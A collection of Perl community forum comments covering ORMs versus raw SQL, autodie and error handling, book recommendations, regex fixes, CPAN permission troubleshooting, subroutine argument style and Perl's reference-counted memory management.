I wasn't "Appealing to my authority" I was stating your claims didn't match with my experience, so you needed to provide something more to back them up, which you haven't (aside from invoking some authorities on accessors being a code smell) - if I wanted to appeal to my authority I'd mention that my name is in the index of Simon Cozens' Advanced Perl vol 2 book and he gave me one of his promo copies of it, and not then admit that it was for a perl module that was already obselete and abandoned before his book was printed. Also I've had similar arguments with a fellow I work with who you might have heard of - a Mr Piers Cawley (and yes we've heard him sing in the office, he's pretty cool to work with), he knows way more about comp sci, object orientation and design patterns, etc than I do - but he argues the opposite to your position about ORMs - he reckons it's not objecty enough, and too close to the SQL - but importantly, unlike you he admits he doesn't know them well enough about them to really write them off. The reason I'm banging on about this is your claims about ORMs making it hard to do anything you can do with raw SQL are long outdated, I can do pretty much any SQL I need either through DBIC, it's extensions or relatively simple code of my own, or by using one of the several options available to specify raw sql, and I'm not an expert or claiming to be an expert - I mean I've been using ORMs very succesfully for a while but speaking to people like mst on irc it's clear that my expertise is quite limited, all the more reason that your claims that "it's hard to do X" or "you can't do Y" stick in my craw - when my experience shows you can and you don't need to be an expert, and does a great diservice to the developer and community of DBIx::Class that provide working code and documentation of a high quality that is amazingly useful, and provide very good and patient support on irc, mailing lists and free workshops at perl conferences and other events.
I have a separate set of issues with those. The vender will have turned SQL into some bastardized programming language. It's rarely pretty, and why bother when you have a proper programming language on top of the database? They have a place for specific things (like carefully controlling transactions and locks to avoid race conditions), but I don't like architecting the whole system around them.
For simple plain SQL it might be easier for you to just use strings and plain DBI. But as soon as the query becomes complicated and dynamic, you're basically hiding the nice SQL behind lots of logic and string-handling. I find the DBIC interface much cleaner and future-proof for such things. That and the fact that DBIC gives me the right places to put the methods that deal with the data is enough for me.
You could use something like this to help you manage your SQL: http://search.cpan.org/~chrisv/SQL-Library-0.0.5/lib/SQL/Library.pm
Actually, while researching some of the replies here, I ran across this: https://metacpan.org/module/SQL::Interp I like this--it helps with some of the more tedious aspects of SQL while staying out of your way when you want full control. Has a little bit different purpose than SQL::Library, though.
Do you or do you not agree that accessors/mutators are bad object design? If you do, then can you not see that ORMs are fundamentally flawed? If you don't, then I'm going to take issue with your approach to Object Oriented Design and suggest you read the JavaWorld article linked above. With that design flaw in mind, even if I did use an ORM, it would still be wrapped inside a `MyApp::DB` class, and would be the only thing in the application allowed to do anything directly with the database. (Edit: as it happens, while researching some things for this thread, I ran across [SQL::Interp](https://metacpan.org/module/SQL::Interp). I like this approach to an SQL builder and may give it a try in a real app.)
Everything you ever wanted to do with find(1) but couldn't. The most powerful file management construct in all of UNIX is ls | perl -ne 'chomp; &lt;do some stuff&gt;; print &lt;some commands&gt;' | sh I use it daily. 
Tried autodie, didn't like it. It may be a nice idea, but I miss error checking in the code. Because, sooner or later, I'll forget to put "use autodie" in my code with the file operations going unchecked. 
YES. Thank you. I find autodie offensive, and am saddened that people can't write error-handling code any more. Can't close filehandle 'OUT': 'No space left on device' at -e line 1 vs myscript: error writing new config file /dev/full: No space left on device * Always include script/program name prefix. You never know when someone might invoke your script from somewhere else, multiple levels deep. * When applicable, include the path to the file in question. An end user doesn't know or care about your filehandle, but if s/he knows the path to the file, might be able to track down problems. * When applicable, give some context to explain what you were trying to do. Make it a unique error message. * Don't bother with the line number. End users don't care; those who do will find your error message because it's unique (see above).
I only use autodie in short utility scripts that aren't much above the level of a throwaway one liner. Bigger programs need better error handling, but it's convenient for quick and dirty.
`perl -ne 'for (glob "*") {system(cmd, arg1, ..., argn);}` would be safer.
Agreed. I'm writing a library at $work right now where exceptions would be awesome (but I'm stuck using C rather than C++). Many of the library functions might have error conditions that I'm not aware of - silently failing is less than unhelpful. What I really want is a stack trace of the failing call and crash so I can see what's failing and when, but without having to write a bunch of boilerplate error handling code. =(
You can do all of this with autodie too. Catch the exception and then print your own message. That's no harder than checking an error code and printing your own message. The difference being that if you forgot a place in your code to do that (or didn't realize that something could fail silently until you checked for some error flag) then your code stops and gives at least some indication of why and you're not left with a corrupted state.
Because Google Reader doesn't have filters, I use a Perl script to automatically filter out items that don't interest me and star items that do.
I agree with his first point. Autodie is so "instrusive" and changes so many built-in's that if it's really something the Perl community approves of it should be in core and documented with core (but it's nice that it was prototyped on CPAN to begin with). But his second point is basically "I hate exceptions, I'd rather manually check error codes". Not really an argument against autodie, but against exceptions in general. While Perl's exceptions aren't the greatest (let's get some real objects, not just strings) I definitely prefer exceptions to manually checking error codes.
Can you elaborate a bit? Are you using something like WWW::Mechanize to scrape the content, or using some kind of perl google reader api?
[WebService::Google::Reader](http://search.cpan.org/dist/WebService-Google-Reader/)
Hot damn. Thanks!
Do you use Nagios? I have a script which: 1. Parses the Nagios state retention file 2. Walks the host and service states to find any which are not OK 3. Issues Nagios external commands to acknowledge the non-OK states It's very handy for bringing new Nagios installs online when the servers being monitored are not yet fully configured. The state parsing code can additionally be re-used when performing other tasks such as sending out automated status reports or similar.
The "exceptions are a form of goto and goto is bad" argument is a strawman.
The core may be similar but the philosophy and higher level API are strongly divergent. I/O is extremely different. There is no file versioning (of which I am aware). In short, well, no, it's not.
Thanks for this, I'd love to see more. I've been using Perl and Gnuplot quite a bit lately for software defined radio stuff but only through pipes. I'll have to give the actual modules a try. My PDL is not so good but I've used it a few times with FITS modules.
I almost put in a "yes, this is an oversimplification" in my statement to fend off the pedantry. The "philosophy" of the NT and VMS kernels are almost exactly the same because NT was (re)written by a group of core VMS developers that were snagged by MS in the late 1980s. It was a big deal at the time. NT was even available on the DEC Alpha chip in its first commercial iteration (I suspect because that's what the former-DEC engineers developed on -- x86 chips at the time were unimpressive, to say the least.) The differences can almost all be traced down to the difference in architecture between Alpha and x86. This is *still* an oversimplification, and I doubt the two kernels share any significant code, but my throwaway line isn't quite worthy of your "in short...no" dismissal.
Why don't you just use `URI`? Or, one of the many other URI parsing modules? Also, [URI provides a great starting point to do it with a regex](https://metacpan.org/module/URI#PARSING-URIs-WITH-REGEXP): &gt; **PARSING URIs WITH REGEXP** &gt; &gt; As an alternative to this module, the following (official) regular expression can be used to decode a URI: &gt; my($scheme, $authority, $path, $query, $fragment) = $uri =~ m|(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; &gt; The URI::Split module provides the function uri_split() as a readable alternative. 
With ActiveState, many: -Generate xml from a database, hourly, and send it through SOAP to another service. -Upload data to ftp servers nightly and receive email if there's something wrong. -Run many programs nightly saving at least an hour a day from my time. -Generate excel graphs looking for behaviors or patterns. -Automate tasks for my buddies at the O. -Group, rename, zip and then email files from 12 different locations. -Generate very advanced web reports. -Monitor real time data for discrepancies. -etc Like someone once said: "we were cooking with fire and you put us cooking on a microwave" lol
I'll toss a vote in for "`use URI;`". It's almost a guarantee that whatever changes or tests you want to do can be done either via checking -&gt;host, -&gt;path, or -&gt;query_path (or was that -&gt;path_query? Always have to look up the docs for that one) and a simple test. It has the major plus side of working for more URIs than you can possibly code for, **and** future maintainers of your code will not want to axe murder you.
Also, keep in mind with urls sometimes it's easier and more efficient to just split on '/' and reconstruct.
Sorry, I edited my post one too many times when posted and my subsequent edits to improve my clarity were halted. What my problem actually is **is** a syntax error. Not a faulty response from the program. I'm hung on your first point as possibly being my problem. I've seen multiple uses of parenthesis, specifically from PerlMonk examples, in an S&amp;R function. I don't think that is the problem. Regardless, I did away with them. I've cleaned up the code to the point that the error is isolated when using brackets. I want to pull out the ID's from the old URL and place them in the new URL format. Your second point I caught right after I posted (tried to edit but it wouldn't accept). I hadn't done regex since the summer and made a brain fart when copying over from one of my examples. Your third point I cleaned up with the cancel character '\'. Your fourth point might also be of some concern now. Does the '!' character work exactly the same as the /? I tried simple S&amp;R examples and it didn't do anything. Right now I have the phrase working correctly with '/' (cancelling when needed). It's just the brackets it doesn't like The intended use is to ultimately be run on multiple html documents to find the specific ID for the link (scattered throughout multiple parts of the URL) and replace it with the new URL and the specific ID. I actually purposefully included as little code as possible (I'm positive the issue only exists in the S&amp;R function but showed header and source to be thorough). Just to be clear: s/html:\\www\.example\.com\/id\?=[\d*]\/aFewMoreTimes/testString/g Does not match, but when the brackets are removed, it matches. It now is **not** causing syntax error. I want to use the term '$1' '$2' etc to use in the replacement URL. Thanks for your help. 
By that matter so is `if`.
You are misusing the character class construct. `[\d*]` means "any one character from the class of characters formed by the union of (characters that are digits) and (the asterisk)". If you are trying to match more than one character, this will not work. You probably want to match one-or-more digits, which is `\d+`. If you want that string to be available as a $-variable in the replacement string, put it in a paren group: `(\d+)`. I never said to get rid of parentheses in the regex, but in the replacement string. My example above has parentheses in the regex. You also probably want `http://` not `http:\\`. And if you are using `!` as the delimiter, you do not need to backslash-escape forward slashes. 
"people like you". I think you mean people like YOURSELF. You're being a dick, too. You need to fix your shit, fast, or you'll find yourself like plenty of other over educated pricks no one wants to work with.
Alright, thanks. I think both me and the author I responded to could use that.
Learning Perl.
I programmed in Perl for about 2 years before I read this book. After reading, learned many new things, and reinforced what I learned from tutorials. I bet the snippet in the intro would still bring a huge ? to my face.
You need to give "why" and not just "it's more popular. I don't use emacs so can't help you there.
Programming Perl is an essential reference and for more advanced topics. Not sure about introductory works.
Anything by "brian d foy" is your best bet. O'Reilly has four books that would be very helpful. The first three are a "trilogy" of sorts: Learning Perl, Intermediate Perl, and Advanced Perl. Finally, there is Programming in Perl, which is a massive (1000k+ pages) guide and is an incredible desk reference.
man perlfunc
Since you said the company was footing the bill, you might consider the OReilly PERL CD Bookshelf. It is several of the books in HTML. It allows you text search all of the books which can save time and headaches. 
I would definitely back this up. Not only is it a good primer into Perl, it also discusses numerous modern patterns and methodologies that will serve you very well. I was always a fan of Learning Perl and Programming Perl for reference, but they have both been largely superseded or used for reference as a result of this book for me.
And perldoc perl has a list of all those manual pages.
Yes, he puts out very good, clear stuff. I second this.
No. I doubt that he means Selena Sol (who is, after all, not a woman). He probably means Liz Castro. The full story is on use.perl at http://use.perl.org/use.perl.org/_davorg/journal/11724.html and I'm not proud of any of it.
Upvote for Effective Perl Programming. 
O'Reilly's Learning Perl, Programming Perl, and Perl Best Practices will take you far.
Perl in a Nutshell
2nd edition (although really it's more of a second volume) of Advanced perl programming, by Simon Cozens, gives a great crash course of the various areas of perl programming too.
They'll all be pretty out of date, if you want to do something like that just get the online subscription and get the latest books online and easily
I think that Perl in a Nutshell is rather too old to be useful these days.
I guess it depends on if you're writing new Perl or trying to figure out the Perl you inherited. 
It is a good intro.
Totally works...
This module is ignored; it requires `common::sense`. I'll quote myself [from the docs](http://search.cpan.org/~mlehmann/common-sense-3.6/sense.pm.PL): &gt;"... I never got past the SYNOPSIS before calling it shit." &gt; [...] &gt; How come no one ever quotes me. :("
I've never seen a plate dispenser like that in my life.
[Reddit](http://search.cpan.org/dist/Reddit), which is what your post linked to, or [Reddit::Client](http://search.cpan.org/dist/Reddit::Client) which is what it claimed to be using? 'Nice' how Reddit requires 5.12.4, no other 5.12 will do.
or the first-in last-out stack data structure... push is to unshift as pop is to shift; push adds on the right, pop takes from the right; unshift adds on the left, shift takes from the left; so you can have a left-facing FIFO with unshift/shift, a right facing FIFO with push/pop; or build a FIFO with unshift/pop or push/shift - depending on what side you want to have be the in and what you want for the out.
there's missing the right curly bracket for the left curly bracket on line 93
That looks a lot better. Thanks! I'm very new to this so I am not 100% sure of the convention. This is how my prof had written it.
I opened the code in vi, then from line 1, pressed =G, and got formatted code. This allowed me to spot your for on line 92 is unclosed...
I've got perltidy bound to a button in vim, it makes it look even better.
[hope this helps](http://codepad.org/Qkk9dJkH), i wouldn't comment the "use strict" or "use warnings", it's helpful to *force* you to keep your code functional and clean, Note: i did some some quick tricks to clean up your code... but not sure what you're wanting to do with it? (you initialize it so that your $ini, or my $SIR[2] is gonna be 5 all the time...) edit: and ya, that for loop which infects inside is not gonna be executed as a consequence.. since you never get $population{$in}{'infState'} = 1;
Thanks! Our assignment is to modify some code he had written to include a "latent" period on top of the susceptible, infectious, and removed periods. It's an epidemiological disease model. I don't think the lines I entered (131-135) work the way they're supposed to. People are supposed to be moved into the latent compartment based on the infectivity of thevirus, and the contact rate of the individuals. On top of this, we're also supposed to create several age groups (the commented variables at the top) and run the simulation with those. How to implement that is impossible for me to grasp at the moment, though, so I'm working solely on the latent period at this point. Thanks again!
Is your book a re-write of Simon Cozen's book, or just a title coincidence?
You need to use the same format for everything. You're bouncing around between formats, sometimes putting stuff all on one line, sometimes using multiple lines. Really you should get in the habit of using *as many lines as possible*. Sure it's cool to write a big script that uses 20 lines, but it will be 100x easier to read if it actually takes up 100 lines instead.
I do version numbers like this: use version; our $VERSION = qv( sprintf '0.8.%d', q$Rev: 1358 $ =~ /\d+/gmx ); The $Rev$ is expanded as an RCS keyword and treated as a literal string by Perl at the same time
I must be missing something fundamental. I'm not able to capture the svn $Revision: $ variable This is perl, v5.10.1 built for MSWin32-x64-multi-thread (with 4 registered patches, see perl -V for more detail) use version; our $VERSION = q$Revision: 6883 $ =~ /(\d+)/g; print "SCRIPT VERSION: $VERSION\n"; #Output follows: SCRIPT VERSION: 1 
I vote for the latter, by far. The processing concerns favor it by tiny tiny amounts, but mostly, it looks cleaner. And it makes it easier to notice when you have too many arguments and should switch to a named hash key solution for your subroutine interface.
&gt;edit: why is this sentence in italics? Because the underscores got parsed by markdown. You can escape them with backslashes.
I have a somewhat related question. Would using splice instead of just copying the variables be better and/or faster?
I made a lot of (temporary) enemies when I started enforcing the my ($var1, $var2, ...) = @_; style at work... but I was sick and tired of reading through all the code in a sub just to figure out what the parameters were. Once people no longer had the option to shift arguments off @_ whenever they felt like it the code suddenly got a lot cleaner.
I would agree with you, *except in this specific case*.
A friend of mine gave a talk at YAPC::NA 2012 about the use of 'my ()' called "The why of my". Check it out: http://www.youtube.com/watch?v=SA4mUs3Ro98
Oh, and before you get cute with me and tell me to "install them to the user's home directory since you don't own the box anyway": &gt;cpan Can't locate App/Cpan.pm in @INC (@INC contains: /data01/home/myuser/modules /data01/home/myuser/myperl/lib /usr/lib64/perl5/site_perl/5.8.8/x86_64-linux-thread-multi /usr/lib/perl5/site_perl/5.8.8 /usr/lib/perl5/site_perl /usr/lib64/perl5/vendor_perl/5.8.8/x86_64-linux-thread-multi /usr/lib/perl5/vendor_perl/5.8.8 /usr/lib/perl5/vendor_perl /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi /usr/lib/perl5/5.8.8 .) at /usr/bin/cpan line 8. BEGIN failed--compilation aborted at /usr/bin/cpan line 8. 
If you run `perl -V` it should list @INC - does it look sensible when you run it as non-root? It might give you some clues. 
That's the same approach I take. Works for me.
Long shot: check if you're actually using the same *perl* executable, as both users.
I'm guessing because taking the first item off the list and moving the pointer to the next item in the list is quicker than seeking deeper into the list for each argument ... but ... you're only using one argument. So I have NFI. DARK MAGIC.
There's a cpan command line tool. I'm of the 'sudo perl -MCPAN -e shell' school myself, so I've never used it. Given the OP is on Redhat, it's possible it was removed in a haphazard and broken fashion by the packager for some reason.
FWIW, I tend to do it that way myself - I was just in a hurry here. &gt;perl -MCPAN -e shell; Can't locate CPAN/FTP/netrc.pm in @INC (@INC contains: /data01/home/myuser/modules /data01/home/myuser/myperl/lib /usr/lib64/perl5/site_perl/5.8.8/x86_64-linux-thread-multi /usr/lib/perl5/site_perl/5.8.8 /usr/lib/perl5/site_perl /usr/lib64/perl5/vendor_perl/5.8.8/x86_64-linux-thread-multi /usr/lib/perl5/vendor_perl/5.8.8 /usr/lib/perl5/vendor_perl /usr/lib64/perl5/5.8.8/x86_64-linux-thread-multi /usr/lib/perl5/5.8.8 /data01/home/myuser) at /usr/lib/perl5/5.8.8/CPAN/FTP.pm line 9. BEGIN failed--compilation aborted at /usr/lib/perl5/5.8.8/CPAN/FTP.pm line 9. Compilation failed in require at /usr/lib/perl5/5.8.8/CPAN.pm line 27. BEGIN failed--compilation aborted at /usr/lib/perl5/5.8.8/CPAN.pm line 27. Compilation failed in require. BEGIN failed--compilation aborted. 
I think I might have this nailed down. Group ownership seems to be to blame. If I do a chmod -R 755 on both /usr/lib/perl5 and /usr/lib64/perl5, suddenly everything works. It's almost like someone got overzealous with permissions lockdowns at some point.
&gt; ls -alhs /usr/lib/perl5/site_perl/5.8.8/Math/Round.pm &gt; ls: /usr/lib/perl5/site_perl/5.8.8/Math/Round.pm: Permission denied That implies it's the permissions on the directory `/usr/lib/perl5/site_perl/5.8.8/Math/` that are wrong, in this particular case. What do you get if you `sudo ls -ld /usr/lib/perl5/site_perl/5.8.8/Math/` ? EDIT: I just saw your subsequent post where you already changed the permissions, so I guess it's too late to find this out now. But for the record, I think the permissions of .../Math/ didn't give execute and/or read permission to your your non-privileged user. 
This is why I do it.
You could also avoid the question entirely by using [`Function::Parameters`](http://search.cpan.org/~mauke/Function-Parameters/lib/Function/Parameters.pm). use Function::Parameters; fun my_sub($var) { ... }
Or in a command line: &gt;perldoc -q copy file Note: I'm not criticizing the OP for asking a question. I'm just pointing out that Perl has solid built-in documentation that a lot of people don't know about, or that they forget about. 
If you already know some programming, get Modern Perl, for reasons I explain in [my Amazon review](http://www.amazon.com/review/R1EAHI4GHDLQ96/ref=cm_cr_pr_perm?ie=UTF8&amp;ASIN=0977920151&amp;linkCode=&amp;nodeID=&amp;tag=). If you are pretty new to programming, get Learning Perl *and* Intermediate Perl. Avoid Programming Perl unless you're an obsessive language geek.
I found this really interesting, I wish we had more active users to comment. I really need to spend some time and dive into 6 but it's hard to find the ideal time.
if you have: my %hugehash = (...) return \%hugehash; No copy is made. or my $hugehash = { ... }; return $hugehash; Again no copy is made.
Thanks! So how/when does the memory space get cleared if I make a big local data structure inside a function that isn't needed outside of the function? Does Perl recognize that there still exists a pointer to that memory space and choose to keep all the data that way? Or when you make a big data structure in a program, does that data stay in memory through the whole duration of the script running unless it calls "delete" or something?
Perl uses [reference-counting](http://en.wikipedia.org/wiki/Reference_counting) to manage memory: each data-structure in your program has a counter keeping track of all the references to it. When a variable goes out of scope (as happens when your function returns) the counter is decremented; if there are no more references, then the space is reclaimed. This is one of the simpler possible [garbage collection](http://en.wikipedia.org/wiki/Garbage_collection_%28computer_science%29) algorithms: the biggest downside is that it doesn't cope well with circular data structures. AIUI the standard way of handling that situation is with [weak references](http://perldoc.perl.org/Scalar/Util.html).
Purely by how the language works, I'd expect the second to make a copy. However, it seems like a sensible optimisation to make, is this what's happening? I've been told the opposite by someone who knows Perl well, but maybe he was just out of date.
I don't follow your explanation at all. Explain what you think the second example is doing. Where is there a list/array?
The reason $hugehash is a hashref and not is a hash is the curly braces. 
Oh, I totally missed that. 
Yeah, I missed the curly braces, so missed that it was a hashref. Not paying enough attention I guess. 
Yes, that too. 
it should be sub sublist { my ($x) = @_; return $x; };
Good point, I change the code and the output.
&gt; link to perl6 channel &gt; actually link to freenode webchat irc://irc.freenode.net/#perl6 should be a direct link edit: dangit, reddit doesn't allow irc:// links in \[\]
24k is how many % ?
You can use perl6 today and expect it to work. It actually works pretty well from a functional point of view. The trick now is to get it fast enough for practical use, and to get a decent number of CPAN modules going on Perl 6.
Well, that's a pretty good question . . . The language has clear improvements, but without a single, very compelling reason (a Killer App, of sorts), I don't see it being picked up.
Do you know who's working on this? I'd like to help.
Most internet providers don't allow outbound port 25 to help block spam from infected consumer machines, you'll want to connect and authenticate using smtp over TLS (assuming hotmail supports that). 
CPAN.
Each new language you learn, you learn a new way of thinking. There are several paradigms in programming: logic, functional, OOP, imperative, ... in Perl you can practice easily many of them. At last, more you learn Perl, better Python programmer you will be. (in other words, know other languages improve you main language).
Python is like a Romance language - fairly regular, fairly orthogonal. Perl is more like English - a big, sprawling, brawl of a language. Like English, it started as a pidgin and got out of hand, turning into a simplified mishmash of at least three other major contributing languages. You don't need to know much grammar to get started, but oh boy is there a lot to learn if you want to. SwellJoe pointed it out nicely: Perl will teach you to think differently than you already do, and you'll come away richer for it -- just like really learning a foreign language helps you think more clearly and expressively in your native language. 
CPAN: Nuclear Weapons to deal with your problems.
P is for Practical. Go learn it, you will find a use for it, someday. Especially for doing homework assignments, if you are still in school. Need to factor a large polynomial with inconvenient numbers? Easy. I did that in just 10 lines of Perl, only yesterday. And, you can extend Perl in many different ways. Use C and the XS extension to provide bindings to your favourite toolkit. Perform system tasks, especially under GNU/Linux. Or, [write poetry](http://perlmonks.org/index.pl?node=Perl%20Poetry) with it, and [confuse](http://perlmonks.org/index.pl?node=Obfuscated%20Code) your friends. [TMTOWTDI](http://duckduckgo.com/?q=TMTOWTDI). See also [duct tape of the internet](http://www.google.com/search?q=duct%20tape%20of%20the%20internet).